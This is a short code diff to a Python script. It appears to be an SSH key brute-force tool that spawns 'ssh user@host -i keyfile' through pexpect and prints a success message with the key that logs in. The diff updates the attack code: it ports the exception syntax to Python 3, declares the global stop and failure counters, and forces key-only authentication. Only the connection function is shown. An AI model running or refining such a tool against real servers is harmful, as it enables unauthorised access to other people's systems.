@@ -20,11 +20,13 @@ stop = False
 fails = 0
 
 def connect(host, user, keyfile, release):
+    global stop
+    global fails
     try:
         perm_denied = 'Permission denied'
         ssh_newkey = ''
         conn_closed = ''
-        opt = ''
+        opt = '-o PasswordAuthentication=no'
         conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
         child = pexpect.spawn(conn_str)
         ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey,
@@ -39,7 +41,7 @@ def connect(host, user, keyfile, release):
         elif ret > 3:
             print('[+] Success. ' + str(keyfile))
             stop = True
-    except Exception, e:
+    except Exception as e:
         if 'read_nonblocking' in str(e):
             fails += 1
             time.sleep(5)
